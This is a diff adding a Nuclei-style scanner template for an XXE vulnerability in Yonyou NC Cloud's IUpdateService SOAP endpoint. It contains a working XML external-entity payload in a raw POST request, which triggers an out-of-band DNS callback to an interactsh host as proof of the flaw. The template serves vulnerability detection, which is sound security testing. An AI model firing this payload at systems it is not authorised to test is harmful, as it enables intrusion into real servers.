@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-nc-cloud-iupdateservice-xxe
+info:
+  name: "用友NC IUpdateService XXE漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <iup:getResult>
+        <!--type:string-->
+        <iup:string><![CDATA[
+        <!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://{{reverse}}">%aaa;%ccc;%ddd;]>
+        <xxx/>]]></iup:string>
+        </iup:getResult>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "design"
+          - "simpchn"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
